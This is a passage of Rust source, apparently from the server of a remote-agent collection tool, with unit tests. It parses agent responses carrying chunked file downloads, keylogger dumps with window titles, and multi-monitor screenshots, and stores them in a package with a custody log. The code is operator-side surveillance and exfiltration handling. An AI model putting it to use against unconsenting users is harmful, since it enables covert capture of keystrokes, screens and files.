                println!("\n[-] Save Error: {}", e);
            }
        }
        return;
    }

    // file:chunk|<batch_ts>|<root>|<rel>|<idx>|<total>|<b64> - one piece of
    // a chunked large-file transfer (7 fields, 6 pipes -> splitn(7)).
    if line.starts_with("file:chunk|") {
        let parts: Vec<&str> = line.splitn(7, '|').collect();
        if parts.len() != 7 {
            log_wire_malformed(sess_id, pkg,
                &format!("malformed file:chunk line ({} of 7 fields)", parts.len()));
            return;
        }
        let (batch_ts, root, rel) = (parts[1], parts[2], parts[3]);
        // Parse as u64 - agent uses u64 to handle files >4 GB on 32-bit targets.
        let chunk_idx    = parts[4].parse::<u64>().unwrap_or(0);
        let total_chunks = parts[5].parse::<u64>().unwrap_or(1);
        let Some(pkg) = pkg else {
            error!(sess_id, file = rel, "No RCM package for session; dropping file:chunk");
            return;
        };
        // NOTE: for old agents the rel path of single-file chunked
        // downloads is the absolute path with '/' separators -
        // paths::reconstruct_download_components handles it.
        // PEEK (not take) so every chunk of a multi-chunk transfer
        // resolves the same announced abs path + metadata; the entry is
        // evicted only after the transfer finalizes (Ok(true)).
        let (abs, meta) = pkg.peek_file_meta(batch_ts, rel)
            .unwrap_or_else(|| (rel.to_string(), CollectedMeta::default()));
        match BASE64.decode(parts[6]) {
            Ok(bytes) => match pkg.store_collected_chunk(&abs, chunk_idx, total_chunks, &bytes, transfer_id, &meta) {
                Ok(true) => {
                    // Finalized: evict the meta-cache entry now.
                    let _ = pkg.take_file_meta(batch_ts, rel);
                    info!(sess_id, file = rel, chunks = total_chunks, "Chunked download complete");
                    let _ = pkg.custody("rcm-server", CustodyAction::Collect,
                        None, Some(&format!("Collected {}", abs)));
                    let _ = pkg.log("agent", "INFO",
                        &format!("Downloaded: {} ({} chunks) [batch {} root {}]", rel, total_chunks, batch_ts, root));
                }
                Ok(false) => { /* mid-transfer; .part kept for resumption */ }
                Err(e) => {
                    error!(sess_id, file = rel, chunk = chunk_idx, error = %e, "Chunk save failed");
                    let _ = pkg.log("agent", "ERROR",
                        &format!("FAILED chunk {}/{} for {}: {}", chunk_idx, total_chunks, rel, e));
                }
            },
            Err(e) => {
                error!(sess_id, file = rel, chunk = chunk_idx, error = %e, "Chunk b64 decode failed");
                let _ = pkg.log("agent", "ERROR",
                    &format!("FAILED chunk {}/{} for {}: b64 decode: {}", chunk_idx, total_chunks, rel, e));
            }
        }
        return;
    }

    // file:report_batch|<batch>|<root>|<json> - batch summary. Recorded in
    // the package log + custody chain; NO report file on disk.
    if line.starts_with("file:report_batch|") {
        let parts: Vec<&str> = line.splitn(4, '|').collect();
        if parts.len() != 4 {
            log_wire_malformed(sess_id, pkg,
                &format!("malformed file:report_batch line ({} of 4 fields)", parts.len()));
            return;
        }
        let (batch, root, json) = (parts[1], parts[2], parts[3]);
        let Some(pkg) = pkg else {
            error!(sess_id, batch = root, "No RCM package for session; dropping file:report_batch");
            return;
        };
        let _ = pkg.log("agent", "INFO", &format!("batch report {}: {}", root, json));
        // One-line custody summary parsed from the report counts.
        // RecursiveReport is a positional seq (see src/file_transfer.rs):
        // [root_path, total_files_found, total_success, failed_downloads].
        let summary = serde_json::from_str::<serde_json::Value>(json)
            .map(|j| {
                let found = j[1].as_u64().unwrap_or(0);
                let ok = j[2].as_u64().unwrap_or(0);
                let failed = j[3].as_array().map(|a| a.len()).unwrap_or(0);
                format!("batch {}: {} found, {} collected, {} failed", batch, found, ok, failed)
            })
            .unwrap_or_else(|_| format!("batch {} report received", batch));
        let _ = pkg.custody("rcm-server", CustodyAction::Collect, None, Some(&summary));
        info!(sess_id, batch = root, "Batch Download Complete");
        println!("\n[+] Batch Complete: {} — {}", root, summary);
        return;
    }
}

/// Extract the payload of a `<MARKER>:` dump (e.g. KEYLOG_DUMP) from command
/// output. Returns Some(payload) ONLY when the output actually IS a dump:
///   - output starts with "<MARKER>:"                       -> rest is payload
///   - output is the job wrapper "JOB_FINAL:<id>|<MARKER>:…" -> payload after
///     the wrapper prefix, marker anchored at the remainder start
/// Any other output that merely CONTAINS the marker substring (ordinary
/// shell output mentioning it, or a crafted suffix) returns None so it
/// falls through to the normal output path UNTOUCHED.
fn extract_dump_payload<'a>(output: &'a str, marker: &str) -> Option<&'a str> {
    let prefixed = format!("{}:", marker);
    if let Some(rest) = output.strip_prefix(prefixed.as_str()) {
        return Some(rest);
    }
    if let Some(rest) = output.strip_prefix("JOB_FINAL:") {
        if let Some((_, after)) = rest.split_once('|') {
            return after.strip_prefix(prefixed.as_str());
        }
    }
    None
}

/// Central command-response pipeline (TLS path). Also used by the HTTP
/// listener so HTTP-transported agents get identical RCM packaging,
/// keylog/screenshot extraction, results-map insert and DB persistence.
pub async fn process_response(sess_id: u32, mut r: CommandResponse, results: &SharedResults, db: &DbPool) {
    // --- KEYLOGGER DUMP HANDLING -> RCM Sec-12 keylog package ---
    // The dump is handled ONLY when the output IS a dump (starts with the
    // marker, or the JOB_FINAL:<id>|<MARKER>: wrapper) - never when an
    // ordinary shell output merely mentions the marker substring.
    let keylog_payload = extract_dump_payload(&r.output, "KEYLOG_DUMP").map(str::to_string);
    if let Some(content) = keylog_payload {
        if content.trim().is_empty() {
            // Empty dump: do NOT swallow the response (polling
            // /api/hosts/:id/output/:req_id would hang forever). Fall
            // through to the normal completion path with a "nothing
            // captured" output.
            r.output = "keylog dump was empty; nothing captured".to_string();
        } else {

        let db_kl = db.clone();
        // Move all blocking file I/O into spawn_blocking
        let store_result = tokio::task::spawn_blocking(move || -> Result<Option<String>, String> {
            let pkg = package_for_session(&db_kl, sess_id)
                .ok_or_else(|| "no RCM package for session".to_string())?;
            let now = Utc::now();

            // Parse the JSONL stream into ONE Sec-12 KeyCapture. A
            // window_change entry closes the current KeyEvent and opens a
            // new one carrying the window title; keystrokes append to the
            // current event's keys. Screenshot entries are embedded as
            // Sec-11 screenshots (toolspecific "keylog").
            let mut events: Vec<KeyEvent> = Vec::new();
            let mut current: Option<KeyEvent> = None;
            let mut min_ts: Option<DateTime<Utc>> = None;
            let mut max_ts: Option<DateTime<Utc>> = None;
            let mut keystroke_count: u64 = 0;
            let mut shot_count: u64 = 0;

            for line in content.lines() {
                if line.trim().is_empty() { continue; }
                let Ok(entry) = serde_json::from_str::<serde_json::Value>(line) else { continue; };
                let entry_dt = rcm_entry_ts(&entry["timestamp"]);
                if let Some(dt) = entry_dt {
                    min_ts = Some(match min_ts { Some(m) => m.min(dt), None => dt });
                    max_ts = Some(match max_ts { Some(m) => m.max(dt), None => dt });
                }
                match entry["type"].as_str() {
                    Some("window_change") => {
                        if let Some(ev) = current.take() { events.push(ev); }
                        let title = entry["data"]["title"].as_str().unwrap_or("").to_string();
                        current = Some(KeyEvent {
                            time: rcm::xml::canonical_ts(&entry_dt.unwrap_or(now)),
                            pid: None,
                            imagename: None,
                            windowtitle: Some(title),
                            keys: String::new(),
                        });
                    }
                    Some("keystroke") => {
                        keystroke_count += 1;
                        let ks_ts = rcm::xml::canonical_ts(&entry_dt.unwrap_or(now));
                        if current.is_none() {
                            // Keystroke before any window_change: open a
                            // default event stamped with the first keystroke.
                            current = Some(KeyEvent {
                                time: ks_ts.clone(),
                                pid: None,
                                imagename: None,
                                windowtitle: None,
                                keys: String::new(),
                            });
                        }
                        let ev = current.as_mut().unwrap();
                        if ev.keys.is_empty() {
                            // Table 7: an <event>'s <time> is the time of the
                            // FIRST KEYSTROKE in that event (not the
                            // window_change time that opened it).
                            ev.time = ks_ts;
                        }
                        if let Some(key) = entry["data"]["key"].as_str() {
                            ev.keys.push_str(key);
                        }
                    }
                    Some("screenshot") => {
                        if let Some(b64_str) = entry["data"]["image_b64"].as_str() {
                            if let Ok(bytes) = BASE64.decode(b64_str) {
                                let mut meta = rcm_screenshot_meta(
                                    entry_dt.unwrap_or(now),
                                    "keylog".to_string(),
                                    None,
                                );
                                // REQ-11.2: the stored extension follows the
                                // announced image kind when it names a known
                                // format; otherwise default to png.
                                let kind = entry["data"]["kind"].as_str().unwrap_or("");
                                meta.ext = match kind {
                                    "png" | "jpg" | "bmp" => kind.to_string(),
                                    _ => "png".to_string(),
                                };
                                match pkg.store_screenshot(&bytes, &meta) {
                                    Ok(_) => shot_count += 1,
                                    Err(e) => {
                                        let _ = pkg.log("agent", "ERROR",
                                            &format!("keylog screenshot store failed: {}", e));
                                    }
                                }
                            }
                        }
                    }
                    _ => {}
                }
            }
            if let Some(ev) = current.take() { events.push(ev); }

            if keystroke_count == 0 {
                // No keystrokes: do NOT write a keylog document with zero
                // keystroke events. Screenshots embedded in the dump may
                // still have been stored above - say so accurately, and
                // record custody ONLY in that case (no artifact, no claim).
                if shot_count > 0 {
                    let _ = pkg.custody("rcm-server", rcm::custody::CustodyAction::Collect,
                        None, Some(&format!("Captured {} keylog screenshot frame(s)", shot_count)));
                }
                let msg = if shot_count > 0 {
                    format!("keylog dump contained no keystrokes; {} screenshot(s) stored", shot_count)
                } else {
                    "keylog dump contained no keystrokes; nothing stored".to_string()
                };
                let _ = pkg.log("agent", "INFO", &msg);
                return Ok(None);
            }

            let capture = KeyCapture {
                starttime: rcm::xml::canonical_ts(&min_ts.unwrap_or(now)),
                endtime: Some(rcm::xml::canonical_ts(&max_ts.unwrap_or(now))),
                user: None,
                events,
            };
            let rel = pkg.store_keylog(&[capture]).map_err(|e| e.to_string())?;
            let _ = pkg.custody("rcm-server", rcm::custody::CustodyAction::Collect,
                None, Some("Keylog captured"));
            let _ = pkg.log("agent", "INFO", "keylog captured");
            Ok(Some(format!("downloads/{}/{}", pkg.root_name(), rel)))
        }).await;

        let msg = match store_result {
            Ok(Ok(Some(path))) => {
                info!(sess_id, path = %path, "Keylogs Processed");
                format!("Keylogs extracted to: {}", path)
            }
            Ok(Ok(None)) => {
                info!(sess_id, "Keylog dump contained no keystrokes");
                "Keylog dump contained no keystrokes; nothing captured".to_string()
            }
            _ => "Keylog extraction failed".to_string(),
        };
        println!("\n[+] {}", msg);

        // Operator-facing results map gets the extraction status; the DB
        // keeps the ORIGINAL raw dump output so the payload is not lost.
        let raw_output = r.output.clone();
        let mut modified_response = r.clone();
        modified_response.output = msg;
        let log_error = modified_response.error.clone();

        results.lock().unwrap_or_else(|e| e.into_inner()).insert((sess_id, r.request_id), modified_response);
        let db_inner = db.clone();
        tokio::task::spawn_blocking(move || {
            if let Ok(conn) = db_inner.get() {
                database::save_client_output(&conn, sess_id, r.request_id, &raw_output, &log_error);
            }
        });
        return;
        }
    }

    // --- SCREENSHOT DUMP HANDLING ---
    // Same anchoring rule as KEYLOG_DUMP: only a real dump (marker at the
    // start, or inside the JOB_FINAL:<id>| wrapper) is intercepted.
    let screenshot_payload = extract_dump_payload(&r.output, "SCREENSHOT_DUMP").map(str::to_string);
    if let Some(content) = screenshot_payload {
        let db_ss = db.clone();

        let screenshot_result = tokio::task::spawn_blocking(move || -> Result<(String, usize), String> {
            let pkg = package_for_session(&db_ss, sess_id)
                .ok_or_else(|| "no RCM package for session".to_string())?;
            // One capture timestamp shared by the whole dump (Sec-11).
            let captured_at = Utc::now();

            let mut count = 0;
            // Use typed deserialization instead of generic serde_json::Value.
            // For multi-monitor screenshots with base64 frames, the generic
            // JSON AST inflates memory 5-10x (every key/value is a separate
            // heap allocation). Typed structs borrow strings from the source.
            #[derive(serde::Deserialize)]
            struct ScreenshotEntry<'a> {
                monitor_index: Option<u64>,
                #[serde(borrow)]
                b64: Option<&'a str>,
            }
            if let Ok(entries) = serde_json::from_str::<Vec<ScreenshotEntry>>(&content) {
                // Track how many frames we've seen per monitor index so
                // multiple frames for the same monitor get distinct
                // toolspecific names (monitor<idx>, monitor<idx>_frame<n>).
                let mut frame_counts: std::collections::HashMap<u64, u32> = std::collections::HashMap::new();
                for entry in entries {
                    if let (Some(idx), Some(b64)) = (entry.monitor_index, entry.b64) {
                        if let Ok(bytes) = BASE64.decode(b64) {
                            let frame = frame_counts.entry(idx).or_insert(0);
                            let toolspecific = if *frame == 0 {
                                format!("monitor{}", idx)
                            } else {
                                format!("monitor{}_frame{}", idx, frame)
                            };
                            *frame += 1;
                            let meta = rcm_screenshot_meta(captured_at, toolspecific,
                                Some(idx.to_string()));
                            match pkg.store_screenshot(&bytes, &meta) {
                                Ok(_) => count += 1,
                                Err(e) => {
                                    let _ = pkg.log("agent", "ERROR",
                                        &format!("screenshot store failed: {}", e));
                                }
                            }
                        }
                    }
                }
            }
            // Provenance is carried by the Sec-11 sidecars; no metadata json.
            // Record custody + package log ONLY when at least one frame was
            // actually stored - garbage JSON must not mint custody claims.
            if count > 0 {
                let _ = pkg.custody("rcm-server", rcm::custody::CustodyAction::Collect,
                    None, Some(&format!("Captured {} screenshot frame(s)", count)));
                let _ = pkg.log("agent", "INFO",
                    &format!("screenshot dump captured ({} frames)", count));
            }

            Ok((format!("downloads/{}/output/screenshots", pkg.root_name()), count))
        }).await;

        let msg = match screenshot_result {
            Ok(Ok((folder, count))) => format!("Saved {} screenshots to: {}", count, folder),
            _ => "Screenshot extraction failed".to_string(),
        };
        println!("\n[+] {}", msg);

        // Operator-facing results map gets the extraction status; the DB
        // keeps the ORIGINAL raw dump output so the payload is not lost.
        let raw_output = r.output.clone();
        let mut modified_response = r.clone();
        modified_response.output = msg;
        let log_error = modified_response.error.clone();

        results.lock().unwrap_or_else(|e| e.into_inner()).insert((sess_id, r.request_id), modified_response);
        let db_inner = db.clone();
        tokio::task::spawn_blocking(move || {
            if let Ok(conn) = db_inner.get() {
                database::save_client_output(&conn, sess_id, r.request_id, &raw_output, &log_error);
            }
        });
        return;
    }
    // -------------------------------------

    // file: family - collected-file storage goes through the RCM package
    // (SPEC §4/§5). The output may contain MULTIPLE newline-separated
    // messages (the agent prefixes file:meta|... before file:data|...), and
    // a buggy/hostile agent can mix plain output in - so run EVERY line
    // through the wire-prefix detector. Lines matching a known wire message
    // are dispatched; everything else FALLS THROUGH to the normal output
    // path below (results map + DB + println) instead of vanishing.
    if r.output.starts_with("file:") {
        let (wire_lines, plain_lines) = partition_wire_lines(&r.output);

        // All dispatch work (r2d2 pool get, SQLite session lookup, package
        // file I/O with sync_all) is blocking: run the ENTIRE multi-line
        // dispatch in ONE spawn_blocking, resolving the package ONCE per
        // response and reusing it for every line, and await the join before
        // returning so ordering vs. subsequent processing is preserved.
        let db_f = db.clone();
        // The transfer identity for all chunked stores of this response
        // (recursive + single-file chunked share it - slots are per-path).
        // Namespaced by session: request ids are per-session counters
        // starting at 1, so two sessions of the SAME target issuing
        // same-path downloads would otherwise collide and mix their
        // .part slots (':' passes rcm's validate_transfer_id).
        let transfer_id = format!("{}:{}", sess_id, r.request_id);
        let _ = tokio::task::spawn_blocking(move || {
            let pkg = package_for_session(&db_f, sess_id);
            for line in &wire_lines {
                handle_file_line(sess_id, line, pkg.as_ref(), &transfer_id);
            }
        }).await;

        if plain_lines.is_empty() {
            return;
        }
        // Non-wire lines continue through the normal pipeline below as if
        // they had been the command's output.
        r.output = plain_lines.join("\n");
    }

    // --- JOB SYSTEM: Streamed output chunks ---
    if r.output.starts_with("JOB_STREAM:") {
        // Format: JOB_STREAM:<job_id>|<line>
        if let Some(rest) = r.output.strip_prefix("JOB_STREAM:") {
            if let Some((job_id_str, line)) = rest.split_once('|') {
                info!(sess_id, job_id = job_id_str, "Job Stream");
                println!("\n[Job {} Sess {}] {}", job_id_str, sess_id, line);
            }
        }
        // Don't store stream chunks in the results map (they're ephemeral)
        return;
    }

    // --- JOB SYSTEM: Final output ---
    if r.output.starts_with("JOB_FINAL:") {
        // Format: JOB_FINAL:<job_id>|<final_output>
        if let Some(rest) = r.output.strip_prefix("JOB_FINAL:") {
            if let Some((job_id_str, output)) = rest.split_once('|') {
                info!(sess_id, job_id = job_id_str, "Job Completed");
                println!("\n[+] Job {} (Sess {}) Completed", job_id_str, sess_id);
                // Store the final output with the cleaned output (no prefix)
                let mut clean_response = r.clone();
                clean_response.output = output.to_string();
                results.lock().unwrap_or_else(|e| e.into_inner()).insert((sess_id, r.request_id), clean_response.clone());
                let db_inner = db.clone();
                tokio::task::spawn_blocking(move || {
                    match db_inner.get() {
                        Ok(conn) => database::save_client_output(&conn, sess_id, clean_response.request_id, &clean_response.output, &clean_response.error),
                        Err(e) => error!(sess_id, req_id = clean_response.request_id, error = %e, "DB pool exhausted"),
                    }
                });
            }
        }
        return;
    }

    results.lock().unwrap_or_else(|e| e.into_inner()).insert((sess_id, r.request_id), r.clone());

    let db_inner = db.clone();
    let r_clone = r.clone();
    tokio::task::spawn_blocking(move || {
        match db_inner.get() {
            Ok(conn) => database::save_client_output(&conn, sess_id, r_clone.request_id, &r_clone.output, &r_clone.error),
            Err(e) => error!(sess_id, req_id = r_clone.request_id, error = %e, "DB pool exhausted, output lost"),
        }
    });

    if !r.error.is_empty() {
        error!(sess_id, req_id = r.request_id, exit_code = r.exit_code, error = %r.error, "Command Failed");
        println!("\n[-] Session {} Error (Exit {}): {}", sess_id, r.exit_code, crate::utils::strip_ansi(&r.error));
    } else if !r.output.trim().is_empty() {
        info!(sess_id, req_id = r.request_id, output = %r.output.trim(), "Command Output Received");
        println!("\n[Sess {} Output]\n{}", sess_id, crate::utils::strip_ansi(r.output.trim()));
    }
}


#[cfg(test)]
mod tests {
    use super::{partition_wire_lines, extract_dump_payload, os_fingerprint_entry};

    #[test]
    fn dump_payload_accepted_at_output_start() {
        assert_eq!(
            extract_dump_payload("KEYLOG_DUMP:{\"a\":1}", "KEYLOG_DUMP"),
            Some("{\"a\":1}")
        );
        assert_eq!(
            extract_dump_payload("SCREENSHOT_DUMP:[]", "SCREENSHOT_DUMP"),
            Some("[]")
        );
    }

    #[test]
    fn dump_payload_accepted_inside_job_final_wrapper() {
        // ext:load wraps results as JOB_FINAL:<id>|<MARKER>:<payload>.
        assert_eq!(
            extract_dump_payload("JOB_FINAL:7|KEYLOG_DUMP:line1\nline2", "KEYLOG_DUMP"),
            Some("line1\nline2")
        );
        assert_eq!(
            extract_dump_payload("JOB_FINAL:42|SCREENSHOT_DUMP:[{}]", "SCREENSHOT_DUMP"),
            Some("[{}]")
        );
    }

    #[test]
    fn dump_payload_rejects_mere_substring_mentions() {
        // Ordinary shell output mentioning the marker must NOT be hijacked.
        assert_eq!(extract_dump_payload("the KEYLOG_DUMP: marker is x", "KEYLOG_DUMP"), None);
        assert_eq!(extract_dump_payload("echo SCREENSHOT_DUMP:", "SCREENSHOT_DUMP"), None);
        // Crafted suffixes must not mint artifacts either.
        assert_eq!(extract_dump_payload("hello\nKEYLOG_DUMP:{\"a\":1}", "KEYLOG_DUMP"), None);
        assert_eq!(extract_dump_payload("JOB_FINAL:7|junk KEYLOG_DUMP:x", "KEYLOG_DUMP"), None);
        // JOB_FINAL without a pipe, or wrapping a different payload.
        assert_eq!(extract_dump_payload("JOB_FINAL:7 KEYLOG_DUMP:x", "KEYLOG_DUMP"), None);
        assert_eq!(extract_dump_payload("JOB_FINAL:7|plain output", "KEYLOG_DUMP"), None);
        // Wrong marker.
        assert_eq!(extract_dump_payload("SCREENSHOT_DUMP:[]", "KEYLOG_DUMP"), None);
    }

    #[test]
    fn dump_payload_empty_is_some_not_none() {
        // An empty dump is still a dump - the caller must complete the
        // request (not hang the output poller).
        assert_eq!(extract_dump_payload("KEYLOG_DUMP:", "KEYLOG_DUMP"), Some(""));
        assert_eq!(extract_dump_payload("JOB_FINAL:1|KEYLOG_DUMP:  ", "KEYLOG_DUMP"), Some("  "));
    }

    #[test]
    fn os_fingerprint_entry_matches_spec_5_3_shape() {
        let e = os_fingerprint_entry("HOST-A", "Windows 10", "cid-123");
        assert_eq!(e.target, "machine");
        assert_eq!(e.fp_type, "os");
        assert_eq!(e.version, 1);
        assert_eq!(e.uid, None);
        assert_eq!(
            e.fields,
            vec![
                ("hostname".to_string(), "HOST-A".to_string()),
                ("osversion".to_string(), "Windows 10".to_string()),
                ("usertag".to_string(), "NONE".to_string()),
                ("private_rcm_computerid".to_string(), "cid-123".to_string()),
            ]
        );
    }

    #[test]
    fn partition_separates_wire_and_plain_lines() {
        let out = "file:meta|-|a|b|e30=\nplain output line\nfile:data|/x|644|AAAA\nfile:unknown-thing\nfile:chunk|b|r|f|0|1|AAAA";
        let (wire, plain) = partition_wire_lines(out);
        assert_eq!(wire, vec![
            "file:meta|-|a|b|e30=".to_string(),
            "file:data|/x|644|AAAA".to_string(),
            "file:chunk|b|r|f|0|1|AAAA".to_string(),
        ]);
        // Unknown "file:"-ish lines fall through as plain output instead of
        // being silently swallowed.
        assert_eq!(plain, vec!["plain output line", "file:unknown-thing"]);
    }

    #[test]
    fn partition_recognizes_all_known_wire_prefixes() {
        for line in [
            "file:meta|a|b|c|e30=",
            "file:data_batch|b|r|f|644|AAAA",
            "file:data|/x|644|AAAA",
            "file:chunk|b|r|f|0|1|AAAA",
            "file:report_batch|b|r|{}",
        ] {
            let (wire, plain) = partition_wire_lines(line);
            assert_eq!(wire.len(), 1, "{} should classify as wire", line);
            assert!(plain.is_empty(), "{} should leave no plain lines", line);
        }
    }

    #[test]
    fn partition_treats_plain_text_as_plain_even_with_file_prefix_colon() {
        // "file: " (with a space) is not a wire prefix.
        let (wire, plain) = partition_wire_lines("file: not-a-wire-line\nsecond line");
        assert!(wire.is_empty());
        assert_eq!(plain, vec!["file: not-a-wire-line", "second line"]);
    }

    #[test]
    fn partition_data_batch_not_confused_with_data() {
        // Both share the "file:data" stem; field count differs.
        let (wire, plain) = partition_wire_lines("file:data_batch|b|r|f|644|AAAA");
        assert_eq!(wire.len(), 1);
        assert!(plain.is_empty());
    }
}